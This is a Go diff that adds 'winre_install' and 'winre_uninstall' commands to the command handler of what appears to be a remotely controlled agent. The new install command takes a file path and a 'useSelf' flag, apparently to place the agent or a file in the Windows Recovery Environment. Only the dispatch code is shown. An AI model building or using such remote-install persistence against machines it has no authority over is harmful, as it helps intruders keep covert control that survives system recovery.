@@ -1853,6 +1853,22 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
 		}
 		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
+	case "winre_install":
+		payload := payloadAsMap(envelope["payload"])
+		useSelf := false
+		if v, ok := payload["useSelf"].(bool); ok {
+			useSelf = v
+		}
+		filePath, _ := payload["filePath"].(string)
+		if err := handleWinREInstall(ctx, env, cmdID, filePath, useSelf); err != nil {
+			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
+		}
+		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
+	case "winre_uninstall":
+		if err := handleWinREUninstall(ctx, env, cmdID); err != nil {
+			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
+		}
+		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
 	case "uninstall":
 		res := wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true}
 		_ = wire.WriteMsg(ctx, env.Conn, res)
